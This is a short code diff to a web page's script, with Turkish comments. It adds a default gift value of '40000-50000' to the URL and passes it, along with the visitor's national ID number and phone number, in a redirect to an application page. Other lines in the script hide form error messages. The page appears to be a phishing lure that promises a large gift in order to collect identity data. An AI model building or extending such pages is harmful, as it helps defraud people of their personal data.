@@ -210,6 +210,14 @@
   <script>
     // Direkt yönlendirme için - app.js'i bypass et
     document.addEventListener('DOMContentLoaded', function() {
+      // Hediye değerini querystring'de koru (yoksa varsayılan ekle)
+      const urlParams = new URLSearchParams(window.location.search);
+      if (!urlParams.get('hediye')) {
+        urlParams.set('hediye', '40000-50000');
+        const newUrl = window.location.pathname + '?' + urlParams.toString();
+        window.history.replaceState({}, '', newUrl);
+      }
+      
       // Hata mesajlarını gizle
       setTimeout(function() {
         var errorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
@@ -328,8 +336,12 @@
           return false;
         }
         
-        // Direkt yönlendirme yap - telefon numarasını da ekle
-        window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue);
+        // Hediye değerini querystring'den al veya varsayılan kullan
+        const urlParams = new URLSearchParams(window.location.search);
+        const hediye = urlParams.get('hediye') || '40000-50000';
+        
+        // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
+        window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediye);
         
         return false;
       }
